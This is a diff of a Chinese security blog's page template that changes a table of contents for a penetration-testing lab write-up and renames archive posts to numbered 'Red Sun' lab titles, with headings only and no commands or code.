+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91"><span class="toc-number">2.</span> <span class="toc-text">外网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weblogic-getshell"><span class="toc-number">2.2.</span> <span class="toc-text">weblogic getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="toc-number">2.3.</span> <span class="toc-text">上线msf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#socks%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91"><span class="toc-number">3.1.</span> <span class="toc-text">socks代理扫描内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ms17-010"><span class="toc-number">3.2.</span> <span class="toc-text">ms17-010</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E6%B4%BE%E7%94%9Fcs%E4%BC%9A%E8%AF%9D"><span class="toc-number">3.3.</span> <span class="toc-text">msf派生cs会话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.4.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.5.</span> <span class="toc-text">横向移动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">权限维持</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -2236,16 +2076,6 @@
         
         
         
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
     
     
     
@@ -2317,7 +2147,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">08/09</span>
-            <a class="archive-post-title" href="/2021/08/09/%E8%AE%B0%E4%B8%80%E6%AC%A1docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">记一次docker逃逸学习</a>
+            <a class="archive-post-title" href="/2021/08/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/">红日靶场4</a>
         </li>
     
         
@@ -2335,7 +2165,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">07/21</span>
-            <a class="archive-post-title" href="/2021/07/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">记一次内网渗透靶场学习</a>
+            <a class="archive-post-title" href="/2021/07/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">红日靶场2</a>
         </li>
     
         
@@ -2353,7 +2183,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">07/19</span>
-            <a class="archive-post-title" href="/2021/07/19/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%982/">一次简单的内网渗透靶场实战2</a>
+            <a class="archive-post-title" href="/2021/07/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA3/">红日靶场3</a>
         </li>
     
         
@@ -2371,7 +2201,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">07/06</span>
-            <a class="archive-post-title" href="/2021/07/06/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">一次简单的内网渗透靶场实战</a>
+            <a class="archive-post-title" href="/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/">红日靶场5</a>
         </li>
     
         
@@ -2617,7 +2447,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">04/09</span>
-            <a class="archive-post-title" href="/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/">巧用smb beacon拿下不出网主机</a>
+            <a class="archive-post-title" href="/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/">巧用smb beacon拿下不出网主机(红日靶场1)</a>
         </li>
     
         
